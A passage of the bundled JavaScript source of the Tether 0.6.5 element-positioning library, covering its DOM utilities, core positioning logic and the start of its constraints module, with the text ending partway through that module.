/*! tether 0.6.5 */


(function(root, factory) {
  if (typeof define === 'function' && define.amd) {
    define(factory);
  } else if (typeof exports === 'object') {
    module.exports = factory(require,exports,module);
  } else {
    root.Tether = factory();
  }
}(this, function(require,exports,module) {

(function() {
  var Evented, addClass, defer, deferred, extend, flush, getBounds, getOffsetParent, getOrigin, getScrollBarSize, getScrollParent, hasClass, node, removeClass, uniqueId, updateClasses, zeroPosCache,
    __hasProp = {}.hasOwnProperty,
    __indexOf = [].indexOf || function(item) { for (var i = 0, l = this.length; i < l; i++) { if (i in this && this[i] === item) return i; } return -1; },
    __slice = [].slice;

  if (this.Tether == null) {
    this.Tether = {
      modules: []
    };
  }

  getScrollParent = function(el) {
    var parent, position, scrollParent, style, _ref;
    position = getComputedStyle(el).position;
    if (position === 'fixed') {
      return el;
    }
    scrollParent = void 0;
    parent = el;
    while (parent = parent.parentNode) {
      try {
        style = getComputedStyle(parent);
      } catch (_error) {}
      if (style == null) {
        return parent;
      }
      if (/(auto|scroll)/.test(style['overflow'] + style['overflow-y'] + style['overflow-x'])) {
        if (position !== 'absolute' || ((_ref = style['position']) === 'relative' || _ref === 'absolute' || _ref === 'fixed')) {
          return parent;
        }
      }
    }
    return document.body;
  };

  uniqueId = (function() {
    var id;
    id = 0;
    return function() {
      return id++;
    };
  })();

  zeroPosCache = {};

  getOrigin = function(doc) {
    var id, k, node, v, _ref;
    node = doc._tetherZeroElement;
    if (node == null) {
      node = doc.createElement('div');
      node.setAttribute('data-tether-id', uniqueId());
      extend(node.style, {
        top: 0,
        left: 0,
        position: 'absolute'
      });
      doc.body.appendChild(node);
      doc._tetherZeroElement = node;
    }
    id = node.getAttribute('data-tether-id');
    if (zeroPosCache[id] == null) {
      zeroPosCache[id] = {};
      _ref = node.getBoundingClientRect();
      for (k in _ref) {
        v = _ref[k];
        zeroPosCache[id][k] = v;
      }
      defer(function() {
        return zeroPosCache[id] = void 0;
      });
    }
    return zeroPosCache[id];
  };

  node = null;

  getBounds = function(el) {
    var box, doc, docEl, k, origin, v, _ref;
    if (el === document) {
      doc = document;
      el = document.documentElement;
    } else {
      doc = el.ownerDocument;
    }
    docEl = doc.documentElement;
    box = {};
    _ref = el.getBoundingClientRect();
    for (k in _ref) {
      v = _ref[k];
      box[k] = v;
    }
    origin = getOrigin(doc);
    box.top -= origin.top;
    box.left -= origin.left;
    if (box.width == null) {
      box.width = document.body.scrollWidth - box.left - box.right;
    }
    if (box.height == null) {
      box.height = document.body.scrollHeight - box.top - box.bottom;
    }
    box.top = box.top - docEl.clientTop;
    box.left = box.left - docEl.clientLeft;
    box.right = doc.body.clientWidth - box.width - box.left;
    box.bottom = doc.body.clientHeight - box.height - box.top;
    return box;
  };

  getOffsetParent = function(el) {
    return el.offsetParent || document.documentElement;
  };

  getScrollBarSize = function() {
    var inner, outer, width, widthContained, widthScroll;
    inner = document.createElement('div');
    inner.style.width = '100%';
    inner.style.height = '200px';
    outer = document.createElement('div');
    extend(outer.style, {
      position: 'absolute',
      top: 0,
      left: 0,
      pointerEvents: 'none',
      visibility: 'hidden',
      width: '200px',
      height: '150px',
      overflow: 'hidden'
    });
    outer.appendChild(inner);
    document.body.appendChild(outer);
    widthContained = inner.offsetWidth;
    outer.style.overflow = 'scroll';
    widthScroll = inner.offsetWidth;
    if (widthContained === widthScroll) {
      widthScroll = outer.clientWidth;
    }
    document.body.removeChild(outer);
    width = widthContained - widthScroll;
    return {
      width: width,
      height: width
    };
  };

  extend = function(out) {
    var args, key, obj, val, _i, _len, _ref;
    if (out == null) {
      out = {};
    }
    args = [];
    Array.prototype.push.apply(args, arguments);
    _ref = args.slice(1);
    for (_i = 0, _len = _ref.length; _i < _len; _i++) {
      obj = _ref[_i];
      if (obj) {
        for (key in obj) {
          if (!__hasProp.call(obj, key)) continue;
          val = obj[key];
          out[key] = val;
        }
      }
    }
    return out;
  };

  removeClass = function(el, name) {
    var cls, _i, _len, _ref, _results;
    if (el.classList != null) {
      _ref = name.split(' ');
      _results = [];
      for (_i = 0, _len = _ref.length; _i < _len; _i++) {
        cls = _ref[_i];
        if (cls.trim()) {
          _results.push(el.classList.remove(cls));
        }
      }
      return _results;
    } else {
      return el.className = el.className.replace(new RegExp("(^| )" + (name.split(' ').join('|')) + "( |$)", 'gi'), ' ');
    }
  };

  addClass = function(el, name) {
    var cls, _i, _len, _ref, _results;
    if (el.classList != null) {
      _ref = name.split(' ');
      _results = [];
      for (_i = 0, _len = _ref.length; _i < _len; _i++) {
        cls = _ref[_i];
        if (cls.trim()) {
          _results.push(el.classList.add(cls));
        }
      }
      return _results;
    } else {
      removeClass(el, name);
      return el.className += " " + name;
    }
  };

  hasClass = function(el, name) {
    if (el.classList != null) {
      return el.classList.contains(name);
    } else {
      return new RegExp("(^| )" + name + "( |$)", 'gi').test(el.className);
    }
  };

  updateClasses = function(el, add, all) {
    var cls, _i, _j, _len, _len1, _results;
    for (_i = 0, _len = all.length; _i < _len; _i++) {
      cls = all[_i];
      if (__indexOf.call(add, cls) < 0) {
        if (hasClass(el, cls)) {
          removeClass(el, cls);
        }
      }
    }
    _results = [];
    for (_j = 0, _len1 = add.length; _j < _len1; _j++) {
      cls = add[_j];
      if (!hasClass(el, cls)) {
        _results.push(addClass(el, cls));
      } else {
        _results.push(void 0);
      }
    }
    return _results;
  };

  deferred = [];

  defer = function(fn) {
    return deferred.push(fn);
  };

  flush = function() {
    var fn, _results;
    _results = [];
    while (fn = deferred.pop()) {
      _results.push(fn());
    }
    return _results;
  };

  Evented = (function() {
    function Evented() {}

    Evented.prototype.on = function(event, handler, ctx, once) {
      var _base;
      if (once == null) {
        once = false;
      }
      if (this.bindings == null) {
        this.bindings = {};
      }
      if ((_base = this.bindings)[event] == null) {
        _base[event] = [];
      }
      return this.bindings[event].push({
        handler: handler,
        ctx: ctx,
        once: once
      });
    };

    Evented.prototype.once = function(event, handler, ctx) {
      return this.on(event, handler, ctx, true);
    };

    Evented.prototype.off = function(event, handler) {
      var i, _ref, _results;
      if (((_ref = this.bindings) != null ? _ref[event] : void 0) == null) {
        return;
      }
      if (handler == null) {
        return delete this.bindings[event];
      } else {
        i = 0;
        _results = [];
        while (i < this.bindings[event].length) {
          if (this.bindings[event][i].handler === handler) {
            _results.push(this.bindings[event].splice(i, 1));
          } else {
            _results.push(i++);
          }
        }
        return _results;
      }
    };

    Evented.prototype.trigger = function() {
      var args, ctx, event, handler, i, once, _ref, _ref1, _results;
      event = arguments[0], args = 2 <= arguments.length ? __slice.call(arguments, 1) : [];
      if ((_ref = this.bindings) != null ? _ref[event] : void 0) {
        i = 0;
        _results = [];
        while (i < this.bindings[event].length) {
          _ref1 = this.bindings[event][i], handler = _ref1.handler, ctx = _ref1.ctx, once = _ref1.once;
          handler.apply(ctx != null ? ctx : this, args);
          if (once) {
            _results.push(this.bindings[event].splice(i, 1));
          } else {
            _results.push(i++);
          }
        }
        return _results;
      }
    };

    return Evented;

  })();

  this.Tether.Utils = {
    getScrollParent: getScrollParent,
    getBounds: getBounds,
    getOffsetParent: getOffsetParent,
    extend: extend,
    addClass: addClass,
    removeClass: removeClass,
    hasClass: hasClass,
    updateClasses: updateClasses,
    defer: defer,
    flush: flush,
    uniqueId: uniqueId,
    Evented: Evented,
    getScrollBarSize: getScrollBarSize
  };

}).call(this);

(function() {
  var MIRROR_LR, MIRROR_TB, OFFSET_MAP, Tether, addClass, addOffset, attachmentToOffset, autoToFixedAttachment, defer, extend, flush, getBounds, getOffsetParent, getOuterSize, getScrollBarSize, getScrollParent, getSize, now, offsetToPx, parseAttachment, parseOffset, position, removeClass, tethers, transformKey, updateClasses, within, _Tether, _ref,
    __slice = [].slice,
    __bind = function(fn, me){ return function(){ return fn.apply(me, arguments); }; };

  if (this.Tether == null) {
    throw new Error("You must include the utils.js file before tether.js");
  }

  Tether = this.Tether;

  _ref = Tether.Utils, getScrollParent = _ref.getScrollParent, getSize = _ref.getSize, getOuterSize = _ref.getOuterSize, getBounds = _ref.getBounds, getOffsetParent = _ref.getOffsetParent, extend = _ref.extend, addClass = _ref.addClass, removeClass = _ref.removeClass, updateClasses = _ref.updateClasses, defer = _ref.defer, flush = _ref.flush, getScrollBarSize = _ref.getScrollBarSize;

  within = function(a, b, diff) {
    if (diff == null) {
      diff = 1;
    }
    return (a + diff >= b && b >= a - diff);
  };

  transformKey = (function() {
    var el, key, _i, _len, _ref1;
    el = document.createElement('div');
    _ref1 = ['transform', 'webkitTransform', 'OTransform', 'MozTransform', 'msTransform'];
    for (_i = 0, _len = _ref1.length; _i < _len; _i++) {
      key = _ref1[_i];
      if (el.style[key] !== void 0) {
        return key;
      }
    }
  })();

  tethers = [];

  position = function() {
    var tether, _i, _len;
    for (_i = 0, _len = tethers.length; _i < _len; _i++) {
      tether = tethers[_i];
      tether.position(false);
    }
    return flush();
  };

  now = function() {
    var _ref1;
    return (_ref1 = typeof performance !== "undefined" && performance !== null ? typeof performance.now === "function" ? performance.now() : void 0 : void 0) != null ? _ref1 : +(new Date);
  };

  (function() {
    var event, lastCall, lastDuration, pendingTimeout, tick, _i, _len, _ref1, _results;
    lastCall = null;
    lastDuration = null;
    pendingTimeout = null;
    tick = function() {
      if ((lastDuration != null) && lastDuration > 16) {
        lastDuration = Math.min(lastDuration - 16, 250);
        pendingTimeout = setTimeout(tick, 250);
        return;
      }
      if ((lastCall != null) && (now() - lastCall) < 10) {
        return;
      }
      if (pendingTimeout != null) {
        clearTimeout(pendingTimeout);
        pendingTimeout = null;
      }
      lastCall = now();
      position();
      return lastDuration = now() - lastCall;
    };
    _ref1 = ['resize', 'scroll', 'touchmove'];
    _results = [];
    for (_i = 0, _len = _ref1.length; _i < _len; _i++) {
      event = _ref1[_i];
      _results.push(window.addEventListener(event, tick));
    }
    return _results;
  })();

  MIRROR_LR = {
    center: 'center',
    left: 'right',
    right: 'left'
  };

  MIRROR_TB = {
    middle: 'middle',
    top: 'bottom',
    bottom: 'top'
  };

  OFFSET_MAP = {
    top: 0,
    left: 0,
    middle: '50%',
    center: '50%',
    bottom: '100%',
    right: '100%'
  };

  autoToFixedAttachment = function(attachment, relativeToAttachment) {
    var left, top;
    left = attachment.left, top = attachment.top;
    if (left === 'auto') {
      left = MIRROR_LR[relativeToAttachment.left];
    }
    if (top === 'auto') {
      top = MIRROR_TB[relativeToAttachment.top];
    }
    return {
      left: left,
      top: top
    };
  };

  attachmentToOffset = function(attachment) {
    var _ref1, _ref2;
    return {
      left: (_ref1 = OFFSET_MAP[attachment.left]) != null ? _ref1 : attachment.left,
      top: (_ref2 = OFFSET_MAP[attachment.top]) != null ? _ref2 : attachment.top
    };
  };

  addOffset = function() {
    var left, offsets, out, top, _i, _len, _ref1;
    offsets = 1 <= arguments.length ? __slice.call(arguments, 0) : [];
    out = {
      top: 0,
      left: 0
    };
    for (_i = 0, _len = offsets.length; _i < _len; _i++) {
      _ref1 = offsets[_i], top = _ref1.top, left = _ref1.left;
      if (typeof top === 'string') {
        top = parseFloat(top, 10);
      }
      if (typeof left === 'string') {
        left = parseFloat(left, 10);
      }
      out.top += top;
      out.left += left;
    }
    return out;
  };

  offsetToPx = function(offset, size) {
    if (typeof offset.left === 'string' && offset.left.indexOf('%') !== -1) {
      offset.left = parseFloat(offset.left, 10) / 100 * size.width;
    }
    if (typeof offset.top === 'string' && offset.top.indexOf('%') !== -1) {
      offset.top = parseFloat(offset.top, 10) / 100 * size.height;
    }
    return offset;
  };

  parseAttachment = parseOffset = function(value) {
    var left, top, _ref1;
    _ref1 = value.split(' '), top = _ref1[0], left = _ref1[1];
    return {
      top: top,
      left: left
    };
  };

  _Tether = (function() {
    _Tether.modules = [];

    function _Tether(options) {
      this.position = __bind(this.position, this);
      var module, _i, _len, _ref1, _ref2;
      tethers.push(this);
      this.history = [];
      this.setOptions(options, false);
      _ref1 = Tether.modules;
      for (_i = 0, _len = _ref1.length; _i < _len; _i++) {
        module = _ref1[_i];
        if ((_ref2 = module.initialize) != null) {
          _ref2.call(this);
        }
      }
      this.position();
    }

    _Tether.prototype.getClass = function(key) {
      var _ref1, _ref2;
      if ((_ref1 = this.options.classes) != null ? _ref1[key] : void 0) {
        return this.options.classes[key];
      } else if (((_ref2 = this.options.classes) != null ? _ref2[key] : void 0) !== false) {
        if (this.options.classPrefix) {
          return "" + this.options.classPrefix + "-" + key;
        } else {
          return key;
        }
      } else {
        return '';
      }
    };

    _Tether.prototype.setOptions = function(options, position) {
      var defaults, key, _i, _len, _ref1, _ref2;
      this.options = options;
      if (position == null) {
        position = true;
      }
      defaults = {
        offset: '0 0',
        targetOffset: '0 0',
        targetAttachment: 'auto auto',
        classPrefix: 'tether'
      };
      this.options = extend(defaults, this.options);
      _ref1 = this.options, this.element = _ref1.element, this.target = _ref1.target, this.targetModifier = _ref1.targetModifier;
      if (this.target === 'viewport') {
        this.target = document.body;
        this.targetModifier = 'visible';
      } else if (this.target === 'scroll-handle') {
        this.target = document.body;
        this.targetModifier = 'scroll-handle';
      }
      _ref2 = ['element', 'target'];
      for (_i = 0, _len = _ref2.length; _i < _len; _i++) {
        key = _ref2[_i];
        if (this[key] == null) {
          throw new Error("Tether Error: Both element and target must be defined");
        }
        if (this[key].jquery != null) {
          this[key] = this[key][0];
        } else if (typeof this[key] === 'string') {
          this[key] = document.querySelector(this[key]);
        }
      }
      addClass(this.element, this.getClass('element'));
      addClass(this.target, this.getClass('target'));
      if (!this.options.attachment) {
        throw new Error("Tether Error: You must provide an attachment");
      }
      this.targetAttachment = parseAttachment(this.options.targetAttachment);
      this.attachment = parseAttachment(this.options.attachment);
      this.offset = parseOffset(this.options.offset);
      this.targetOffset = parseOffset(this.options.targetOffset);
      if (this.scrollParent != null) {
        this.disable();
      }
      if (this.targetModifier === 'scroll-handle') {
        this.scrollParent = this.target;
      } else {
        this.scrollParent = getScrollParent(this.target);
      }
      if (this.options.enabled !== false) {
        return this.enable(position);
      }
    };

    _Tether.prototype.getTargetBounds = function() {
      var bounds, fitAdj, hasBottomScroll, height, out, scrollBottom, scrollPercentage, style, target;
      if (this.targetModifier != null) {
        switch (this.targetModifier) {
          case 'visible':
            if (this.target === document.body) {
              return {
                top: pageYOffset,
                left: pageXOffset,
                height: innerHeight,
                width: innerWidth
              };
            } else {
              bounds = getBounds(this.target);
              out = {
                height: bounds.height,
                width: bounds.width,
                top: bounds.top,
                left: bounds.left
              };
              out.height = Math.min(out.height, bounds.height - (pageYOffset - bounds.top));
              out.height = Math.min(out.height, bounds.height - ((bounds.top + bounds.height) - (pageYOffset + innerHeight)));
              out.height = Math.min(innerHeight, out.height);
              out.height -= 2;
              out.width = Math.min(out.width, bounds.width - (pageXOffset - bounds.left));
              out.width = Math.min(out.width, bounds.width - ((bounds.left + bounds.width) - (pageXOffset + innerWidth)));
              out.width = Math.min(innerWidth, out.width);
              out.width -= 2;
              if (out.top < pageYOffset) {
                out.top = pageYOffset;
              }
              if (out.left < pageXOffset) {
                out.left = pageXOffset;
              }
              return out;
            }
            break;
          case 'scroll-handle':
            target = this.target;
            if (target === document.body) {
              target = document.documentElement;
              bounds = {
                left: pageXOffset,
                top: pageYOffset,
                height: innerHeight,
                width: innerWidth
              };
            } else {
              bounds = getBounds(target);
            }
            style = getComputedStyle(target);
            hasBottomScroll = target.scrollWidth > target.clientWidth || 'scroll' === [style.overflow, style.overflowX] || this.target !== document.body;
            scrollBottom = 0;
            if (hasBottomScroll) {
              scrollBottom = 15;
            }
            height = bounds.height - parseFloat(style.borderTopWidth) - parseFloat(style.borderBottomWidth) - scrollBottom;
            out = {
              width: 15,
              height: height * 0.975 * (height / target.scrollHeight),
              left: bounds.left + bounds.width - parseFloat(style.borderLeftWidth) - 15
            };
            fitAdj = 0;
            if (height < 408 && this.target === document.body) {
              fitAdj = -0.00011 * Math.pow(height, 2) - 0.00727 * height + 22.58;
            }
            if (this.target !== document.body) {
              out.height = Math.max(out.height, 24);
            }
            scrollPercentage = this.target.scrollTop / (target.scrollHeight - height);
            out.top = scrollPercentage * (height - out.height - fitAdj) + bounds.top + parseFloat(style.borderTopWidth);
            if (this.target === document.body) {
              out.height = Math.max(out.height, 24);
            }
            return out;
        }
      } else {
        return getBounds(this.target);
      }
    };

    _Tether.prototype.clearCache = function() {
      return this._cache = {};
    };

    _Tether.prototype.cache = function(k, getter) {
      if (this._cache == null) {
        this._cache = {};
      }
      if (this._cache[k] == null) {
        this._cache[k] = getter.call(this);
      }
      return this._cache[k];
    };

    _Tether.prototype.enable = function(position) {
      if (position == null) {
        position = true;
      }
      addClass(this.target, this.getClass('enabled'));
      addClass(this.element, this.getClass('enabled'));
      this.enabled = true;
      if (this.scrollParent !== document) {
        this.scrollParent.addEventListener('scroll', this.position);
      }
      if (position) {
        return this.position();
      }
    };

    _Tether.prototype.disable = function() {
      removeClass(this.target, this.getClass('enabled'));
      removeClass(this.element, this.getClass('enabled'));
      this.enabled = false;
      if (this.scrollParent != null) {
        return this.scrollParent.removeEventListener('scroll', this.position);
      }
    };

    _Tether.prototype.destroy = function() {
      var i, tether, _i, _len, _results;
      this.disable();
      _results = [];
      for (i = _i = 0, _len = tethers.length; _i < _len; i = ++_i) {
        tether = tethers[i];
        if (tether === this) {
          tethers.splice(i, 1);
          break;
        } else {
          _results.push(void 0);
        }
      }
      return _results;
    };

    _Tether.prototype.updateAttachClasses = function(elementAttach, targetAttach) {
      var add, all, side, sides, _i, _j, _len, _len1, _ref1,
        _this = this;
      if (elementAttach == null) {
        elementAttach = this.attachment;
      }
      if (targetAttach == null) {
        targetAttach = this.targetAttachment;
      }
      sides = ['left', 'top', 'bottom', 'right', 'middle', 'center'];
      if ((_ref1 = this._addAttachClasses) != null ? _ref1.length : void 0) {
        this._addAttachClasses.splice(0, this._addAttachClasses.length);
      }
      add = this._addAttachClasses != null ? this._addAttachClasses : this._addAttachClasses = [];
      if (elementAttach.top) {
        add.push("" + (this.getClass('element-attached')) + "-" + elementAttach.top);
      }
      if (elementAttach.left) {
        add.push("" + (this.getClass('element-attached')) + "-" + elementAttach.left);
      }
      if (targetAttach.top) {
        add.push("" + (this.getClass('target-attached')) + "-" + targetAttach.top);
      }
      if (targetAttach.left) {
        add.push("" + (this.getClass('target-attached')) + "-" + targetAttach.left);
      }
      all = [];
      for (_i = 0, _len = sides.length; _i < _len; _i++) {
        side = sides[_i];
        all.push("" + (this.getClass('element-attached')) + "-" + side);
      }
      for (_j = 0, _len1 = sides.length; _j < _len1; _j++) {
        side = sides[_j];
        all.push("" + (this.getClass('target-attached')) + "-" + side);
      }
      return defer(function() {
        if (_this._addAttachClasses == null) {
          return;
        }
        updateClasses(_this.element, _this._addAttachClasses, all);
        updateClasses(_this.target, _this._addAttachClasses, all);
        return _this._addAttachClasses = void 0;
      });
    };

    _Tether.prototype.position = function(flushChanges) {
      var elementPos, elementStyle, height, left, manualOffset, manualTargetOffset, module, next, offset, offsetBorder, offsetParent, offsetParentSize, offsetParentStyle, offsetPosition, ret, scrollLeft, scrollTop, scrollbarSize, side, targetAttachment, targetOffset, targetPos, targetSize, top, width, _i, _j, _len, _len1, _ref1, _ref2, _ref3, _ref4, _ref5, _ref6,
        _this = this;
      if (flushChanges == null) {
        flushChanges = true;
      }
      if (!this.enabled) {
        return;
      }
      this.clearCache();
      targetAttachment = autoToFixedAttachment(this.targetAttachment, this.attachment);
      this.updateAttachClasses(this.attachment, targetAttachment);
      elementPos = this.cache('element-bounds', function() {
        return getBounds(_this.element);
      });
      width = elementPos.width, height = elementPos.height;
      if (width === 0 && height === 0 && (this.lastSize != null)) {
        _ref1 = this.lastSize, width = _ref1.width, height = _ref1.height;
      } else {
        this.lastSize = {
          width: width,
          height: height
        };
      }
      targetSize = targetPos = this.cache('target-bounds', function() {
        return _this.getTargetBounds();
      });
      offset = offsetToPx(attachmentToOffset(this.attachment), {
        width: width,
        height: height
      });
      targetOffset = offsetToPx(attachmentToOffset(targetAttachment), targetSize);
      manualOffset = offsetToPx(this.offset, {
        width: width,
        height: height
      });
      manualTargetOffset = offsetToPx(this.targetOffset, targetSize);
      offset = addOffset(offset, manualOffset);
      targetOffset = addOffset(targetOffset, manualTargetOffset);
      left = targetPos.left + targetOffset.left - offset.left;
      top = targetPos.top + targetOffset.top - offset.top;
      _ref2 = Tether.modules;
      for (_i = 0, _len = _ref2.length; _i < _len; _i++) {
        module = _ref2[_i];
        ret = module.position.call(this, {
          left: left,
          top: top,
          targetAttachment: targetAttachment,
          targetPos: targetPos,
          attachment: this.attachment,
          elementPos: elementPos,
          offset: offset,
          targetOffset: targetOffset,
          manualOffset: manualOffset,
          manualTargetOffset: manualTargetOffset,
          scrollbarSize: scrollbarSize
        });
        if ((ret == null) || typeof ret !== 'object') {
          continue;
        } else if (ret === false) {
          return false;
        } else {
          top = ret.top, left = ret.left;
        }
      }
      next = {
        page: {
          top: top,
          left: left
        },
        viewport: {
          top: top - pageYOffset,
          bottom: pageYOffset - top - height + innerHeight,
          left: left - pageXOffset,
          right: pageXOffset - left - width + innerWidth
        }
      };
      if (document.body.scrollWidth > window.innerWidth) {
        scrollbarSize = this.cache('scrollbar-size', getScrollBarSize);
        next.viewport.bottom -= scrollbarSize.height;
      }
      if (document.body.scrollHeight > window.innerHeight) {
        scrollbarSize = this.cache('scrollbar-size', getScrollBarSize);
        next.viewport.right -= scrollbarSize.width;
      }
      if (((_ref3 = document.body.style.position) !== '' && _ref3 !== 'static') || ((_ref4 = document.body.parentElement.style.position) !== '' && _ref4 !== 'static')) {
        next.page.bottom = document.body.scrollHeight - top - height;
        next.page.right = document.body.scrollWidth - left - width;
      }
      if (((_ref5 = this.options.optimizations) != null ? _ref5.moveElement : void 0) !== false && (this.targetModifier == null)) {
        offsetParent = this.cache('target-offsetparent', function() {
          return getOffsetParent(_this.target);
        });
        offsetPosition = this.cache('target-offsetparent-bounds', function() {
          return getBounds(offsetParent);
        });
        offsetParentStyle = getComputedStyle(offsetParent);
        elementStyle = getComputedStyle(this.element);
        offsetParentSize = offsetPosition;
        offsetBorder = {};
        _ref6 = ['Top', 'Left', 'Bottom', 'Right'];
        for (_j = 0, _len1 = _ref6.length; _j < _len1; _j++) {
          side = _ref6[_j];
          offsetBorder[side.toLowerCase()] = parseFloat(offsetParentStyle["border" + side + "Width"]);
        }
        offsetPosition.right = document.body.scrollWidth - offsetPosition.left - offsetParentSize.width + offsetBorder.right;
        offsetPosition.bottom = document.body.scrollHeight - offsetPosition.top - offsetParentSize.height + offsetBorder.bottom;
        if (next.page.top >= (offsetPosition.top + offsetBorder.top) && next.page.bottom >= offsetPosition.bottom) {
          if (next.page.left >= (offsetPosition.left + offsetBorder.left) && next.page.right >= offsetPosition.right) {
            scrollTop = offsetParent.scrollTop;
            scrollLeft = offsetParent.scrollLeft;
            next.offset = {
              top: next.page.top - offsetPosition.top + scrollTop - offsetBorder.top,
              left: next.page.left - offsetPosition.left + scrollLeft - offsetBorder.left
            };
          }
        }
      }
      this.move(next);
      this.history.unshift(next);
      if (this.history.length > 3) {
        this.history.pop();
      }
      if (flushChanges) {
        flush();
      }
      return true;
    };

    _Tether.prototype.move = function(position) {
      var css, elVal, found, key, moved, offsetParent, point, same, transcribe, type, val, write, writeCSS, _i, _len, _ref1, _ref2,
        _this = this;
      if (this.element.parentNode == null) {
        return;
      }
      same = {};
      for (type in position) {
        same[type] = {};
        for (key in position[type]) {
          found = false;
          _ref1 = this.history;
          for (_i = 0, _len = _ref1.length; _i < _len; _i++) {
            point = _ref1[_i];
            if (!within((_ref2 = point[type]) != null ? _ref2[key] : void 0, position[type][key])) {
              found = true;
              break;
            }
          }
          if (!found) {
            same[type][key] = true;
          }
        }
      }
      css = {
        top: '',
        left: '',
        right: '',
        bottom: ''
      };
      transcribe = function(same, pos) {
        var xPos, yPos, _ref3;
        if (((_ref3 = _this.options.optimizations) != null ? _ref3.gpu : void 0) !== false) {
          if (same.top) {
            css.top = 0;
            yPos = pos.top;
          } else {
            css.bottom = 0;
            yPos = -pos.bottom;
          }
          if (same.left) {
            css.left = 0;
            xPos = pos.left;
          } else {
            css.right = 0;
            xPos = -pos.right;
          }
          css[transformKey] = "translateX(" + (Math.round(xPos)) + "px) translateY(" + (Math.round(yPos)) + "px)";
          if (transformKey !== 'msTransform') {
            return css[transformKey] += " translateZ(0)";
          }
        } else {
          if (same.top) {
            css.top = "" + pos.top + "px";
          } else {
            css.bottom = "" + pos.bottom + "px";
          }
          if (same.left) {
            return css.left = "" + pos.left + "px";
          } else {
            return css.right = "" + pos.right + "px";
          }
        }
      };
      moved = false;
      if ((same.page.top || same.page.bottom) && (same.page.left || same.page.right)) {
        css.position = 'absolute';
        transcribe(same.page, position.page);
      } else if ((same.viewport.top || same.viewport.bottom) && (same.viewport.left || same.viewport.right)) {
        css.position = 'fixed';
        transcribe(same.viewport, position.viewport);
      } else if ((same.offset != null) && same.offset.top && same.offset.left) {
        css.position = 'absolute';
        offsetParent = this.cache('target-offsetparent', function() {
          return getOffsetParent(_this.target);
        });
        if (getOffsetParent(this.element) !== offsetParent) {
          defer(function() {
            _this.element.parentNode.removeChild(_this.element);
            return offsetParent.appendChild(_this.element);
          });
        }
        transcribe(same.offset, position.offset);
        moved = true;
      } else {
        css.position = 'absolute';
        transcribe({
          top: true,
          left: true
        }, position.page);
      }
      if (!moved && this.element.parentNode.tagName !== 'BODY') {
        this.element.parentNode.removeChild(this.element);
        document.body.appendChild(this.element);
      }
      writeCSS = {};
      write = false;
      for (key in css) {
        val = css[key];
        elVal = this.element.style[key];
        if (elVal !== '' && val !== '' && (key === 'top' || key === 'left' || key === 'bottom' || key === 'right')) {
          elVal = parseFloat(elVal);
          val = parseFloat(val);
        }
        if (elVal !== val) {
          write = true;
          writeCSS[key] = css[key];
        }
      }
      if (write) {
        return defer(function() {
          return extend(_this.element.style, writeCSS);
        });
      }
    };

    return _Tether;

  })();

  Tether.position = position;

  this.Tether = extend(_Tether, Tether);

}).call(this);

(function() {
  var BOUNDS_FORMAT, MIRROR_ATTACH, defer, extend, getBoundingRect, getBounds, getOuterSize, getSize, updateClasses, _ref,
    __indexOf = [].indexOf || function(item) { for (var i = 0, l = this.length; i < l; i++) { if (i in this && this[i] === item) return i; } return -1; };

  _ref = this.Tether.Utils, getOuterSize = _ref.getOuterSize, getBounds = _ref.getBounds, getSize = _ref.getSize, extend = _ref.extend, updateClasses = _ref.updateClasses, defer = _ref.defer;

  MIRROR_ATTACH = {
    left: 'right',
    right: 'left',
    top: 'bottom',
    bottom: 'top',
    middle: 'middle'
  };

  BOUNDS_FORMAT = ['left', 'top', 'right', 'bottom'];

  getBoundingRect = function(tether, to) {
    var i, pos, side, size, style, _i, _len;
    if (to === 'scrollParent') {
      to = tether.scrollParent;
    } else if (to === 'window') {
      to = [pageXOffset, pageYOffset, innerWidth + pageXOffset, innerHeight + pageYOffset];
    }
    if (to === document) {
      to = to.documentElement;
    }
    if (to.nodeType != null) {
      pos = size = getBounds(to);
      style = getComputedStyle(to);
      to = [pos.left, pos.top, size.width + pos.left, size.height + pos.top];
      for (i = _i = 0, _len = BOUNDS_FORMAT.length; _i < _len; i = ++_i) {
        side = BOUNDS_FORMAT[i];
        side = side[0].toUpperCase() + side.substr(1);
        if (side === 'Top' || side === 'Left') {
          to[i] += parseFloat(style["border" + side + "Width"]);
        } else {
          to[i] -= parseFloat(style["border" + side + "Width"]);
        }
      }
    }
    return to;
  };

  this.Tether.modules.push({
    position: function(_arg) {
      var addClasses, allClasses, attachment, bounds, changeAttachX, changeAttachY, cls, constraint, eAttachment, height, left, oob, oobClass, p, pin, pinned, pinnedClass, removeClass, side, tAttachment, targetAttachment, targetHeight, targetSize, targetWidth, to, top, width, _i, _j, _k, _l, _len, _len1, _len2, _len3, _len4, _len5, _m, _n, _ref1, _ref2, _ref3, _ref4, _ref5, _ref6, _ref7, _ref8,
        _this = this;
      top = _arg.top, left = _arg.left, targetAttachment = _arg.targetAttachment;
      if (!this.options.constraints) {
        return true;
      }
      removeClass = function(prefix) {
        var side, _i, _len, _results;
        _this.removeClass(prefix);
        _results = [];
        for (_i = 0, _len = BOUNDS_FORMAT.length; _i < _len; _i++) {
          side = BOUNDS_FORMAT[_i];
          _results.push(_this.removeClass("" + prefix + "-" + side));
        }
        return _results;
      };
      _ref1 = this.cache('element-bounds', function() {
        return getBounds(_this.element);
      }), height = _ref1.height, width = _ref1.width;
      if (width === 0 && height === 0 && (this.lastSize != null)) {
        _ref2 = this.lastSize, width = _ref2.width, height = _ref2.height;
      }
      targetSize = this.cache('target-bounds', function() {
        return _this.getTargetBounds();
      });
      targetHeight = targetSize.height;
      targetWidth = targetSize.width;
      tAttachment = {};
      eAttachment = {};
      allClasses = [this.getClass('pinned'), this.getClass('out-of-bounds')];
      _ref3 = this.options.constraints;
      for (_i = 0, _len = _ref3.length; _i < _len; _i++) {
        constraint = _ref3[_i];
        if (constraint.outOfBoundsClass) {
          allClasses.push(constraint.outOfBoundsClass);
        }
        if (constraint.pinnedClass) {
          allClasses.push(constraint.pinnedClass);
        }
      }
      for (_j = 0, _len1 = allClasses.length; _j < _len1; _j++) {
        cls = allClasses[_j];
        _ref4 = ['left', 'top', 'right', 'bottom'];
        for (_k = 0, _len2 = _ref4.length; _k < _len2; _k++) {
          side = _ref4[_k];
          allClasses.push("" + cls + "-" + side);
        }
      }
      addClasses = [];
      tAttachment = extend({}, targetAttachment);
      eAttachment = extend({}, this.attachment);
      _ref5 = this.options.constraints;
      for (_l = 0, _len3 = _ref5.length; _l < _len3; _l++) {
        constraint = _ref5[_l];
        to = constraint.to, attachment = constraint.attachment, pin = constraint.pin;
        if (attachment == null) {
          attachment = '';
        }
        if (__indexOf.call(attachment, ' ') >= 0) {
